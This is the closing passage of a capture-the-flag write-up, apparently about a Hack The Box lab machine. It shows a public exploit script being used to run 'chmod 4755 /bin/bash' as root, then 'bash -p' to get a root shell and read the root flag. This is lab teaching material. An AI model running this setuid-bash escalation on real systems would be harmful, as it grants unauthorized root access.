<span class="n">sau</span><span class="nv">@pc</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span>
</code></pre><br style="line-height: 0.5;"/></div>

The <code>test</code> file was created successfully, and the owner is the <code>root</code> user, indicating that we are executing commands as the system administrator.<br/><br/>
Next, I will simply assign <code>Set-UID</code> privileges to the <code>/bin/bash</code> binary. Then, by executing the <code>bash -p</code> command, we can inherit the privileges of the owner of the <code>/bin/bash</code> binary (in this case, <code>root</code>) and obtain a shell with administrator privileges.<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@kali</span><span class="err">$</span><span class="w"> </span><span class="n">python3</span><span class="w"> </span><span class="mf">51532.</span><span class="n">py</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="nl">localhost</span><span class="p">:</span><span class="mi">8000</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="s1">'chmod 4755 /bin/bash'</span>
<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="k">Check</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="k">host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="nl">alive</span><span class="p">:</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="nl">localhost</span><span class="p">:</span><span class="mi">8000</span>
<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="k">Host</span><span class="w"> </span><span class="n">up</span><span class="p">,</span><span class="w"> </span><span class="n">let</span><span class="err">'</span><span class="n">s</span><span class="w"> </span><span class="n">exploit</span><span class="err">!</span><span class="w"> </span>
<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="n">exploit</span><span class="w"> </span><span class="n">has</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">executeded</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="n">machine</span><span class="p">.</span><span class="w"> </span>
</code></pre><br style="line-height: 0.5;"/></div>

If we list the <code>/bin/bash</code> binary, we can see that we have successfully assigned <code>Set-UID</code> privileges to it:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">sau</span><span class="nv">@pc</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">l</span><span class="w"> </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
<span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="mi">1183448</span><span class="w"> </span><span class="n">Apr</span><span class="w"> </span><span class="mi">18</span><span class="w">  </span><span class="mi">2022</span><span class="w"> </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
<span class="n">sau</span><span class="nv">@pc</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span>
</code></pre><br style="line-height: 0.5;"/></div>

Now, simply by executing the <code>bash -p</code> command, we will obtain a console as the <code>root</code> user:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">sau</span><span class="nv">@pc</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">bash</span><span class="w"> </span><span class="o">-</span><span class="n">p</span>
<span class="n">bash</span><span class="o">-</span><span class="mf">5.0</span><span class="err">#</span><span class="w"> </span><span class="n">whoami</span>
<span class="n">root</span>
<span class="n">bash</span><span class="o">-</span><span class="mf">5.0</span><span class="err">#</span><span class="w"> </span>
</code></pre><br style="line-height: 0.5;"/></div>

Finally, we can view the last flag:<br/><br/>
<div class="codehilite"><pre><span></span><code>bash-5.0# cat /root/root.txt
dde1e**********************a4ce6
bash-5.0# 
</code></pre><br style="line-height: 0.5;"/></div></br></br></br></br></br>
            </div>
        </div>
    </section>

    <footer>
        <p>&copy; 2023 elswix.github.io</p>
    </footer>
</body>
</html>
